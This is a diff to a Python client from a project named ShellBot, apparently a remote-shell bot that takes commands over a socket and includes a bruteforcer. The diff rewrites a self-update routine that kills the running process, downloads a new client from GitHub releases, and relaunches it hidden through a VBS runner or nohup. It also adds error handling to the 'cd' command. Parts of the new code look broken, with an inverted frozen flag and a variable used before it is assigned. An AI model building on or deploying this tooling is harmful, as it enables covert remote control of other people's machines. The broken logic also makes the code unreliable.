@@ -31,9 +31,14 @@ if (len(sys.argv) == 3):
     port = int(sys.argv[2])
 else:
     # Comment the below line and uncomment the next two for a pre-packaged client.
-    sys.exit("Usage: client.py <server ip> <server port>")
-    #host = '0.0.0.0'
-    #port = 9999
+    #sys.exit("Usage: client.py <server ip> <server port>")
+    print("Usage: client.py <server ip> <server port>")
+    host = '127.0.0.1'
+    port = 9999
+    print("Using default values - {}:{}".format(host,port))
+
+if getattr(sys, 'frozen', False): frozen = False
+else: frozen = True
 
 # Used by the Bruteforcer
 def product(*args, **kwds):
@@ -53,23 +58,47 @@ def repeat(object, times=None):
             yield object
 
 # Self Update
-temporary = """
+temporary = """\
 #!/usr/bin/env python3
-import os, urllib2
+import os, sys, urllib.request
 
-response = urllib2.urlopen('https://raw.githubusercontent.com/sayak-brm/'
-                           + 'ShellBot/master/client.py') # Change URL for custom update path.
-html = response.read()
+def getURL(owner, repo, name):
+    import json
 
-os.system("kill %s")
+    response = urllib.request.urlopen('https://api.github.com/repos/{}/{}/releases/latest'.format(owner,repo))
 
-f = open("%s", "w")
-f.write(html)
-f.close()
+    json_val = json.loads(response.read().decode())
 
-os.system("nohup python3 %s %s %s > /dev/null 2>&1 &")
-""" % (os.getpid(), os.path.realpath(__file__), os.path.realpath(__file__),
-       host, port)
+    for file in json_val['assets']:
+        if name == file['name']: return file['browser_download_url']
+
+def download(url, file):
+    import shutil
+
+    with urllib.request.urlopen(url) as response, open(file, 'wb') as out_file:
+        shutil.copyfileobj(response, out_file)
+
+if sys.platform == "win32": os.system("taskkill /PID {pid} /F")
+else: os.system("kill {pid}")
+
+if {frozen}:
+    download(url, "{exe}")
+    url = getURL('sayak-brm', 'ShellBot', 'client.exe')
+else:
+    download(url, "{arg}")
+    url = getURL('sayak-brm', 'ShellBot', 'client.py')
+
+if sys.platform == "win32":
+    if {frozen}: os.system({exe} + " {host} {port}")
+    else:
+        runner = '''Dim WinScriptHost
+Set WinScriptHost = CreateObject("WScript.Shell")
+WinScriptHost.Run Chr(34) & "%s" & Chr(34), 0
+Set WinScriptHost = Nothing''' %({exe} + " " + {arg} + " {host} {port}")
+        with open("%tmp%/runner.vbs", "w") as f: f.write(runner)
+        os.system("%tmp%/runner.vbs")
+else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &")
+""".format(pid=os.getpid(), frozen=frozen, host=host, port=port, exe=sys.executable, arg=sys.argv[0])
 
 def selfUpdate():
     while 1:
@@ -526,9 +555,14 @@ def main(host, port):
                 for onebyone in allofem:
                     commands = onebyone.split( )
                     if (commands[0] == "cd"):
-                        os.chdir(commands[1])
-                        s.send(bytes(os.getcwd(), 'utf-8'))
-                        print("[INFO] Changed dir to %s" % os.getcwd())
+                        try:
+                            os.chdir(commands[1])
+                            s.send(bytes(os.getcwd(), 'utf-8'))
+                            print("[INFO] Changed dir to %s" % os.getcwd())
+                        except FileNotFoundError:
+                            s.send(bytes('[CLIENT - ERROR] Directory missing\n'
+                                         + commands[1], 'utf-8'))
+                            print("[INFO] %s directory not found" % os.getcwd())
                     elif (commands[0] == "selfupdateall"):
                         selfUpdate()
                         return None
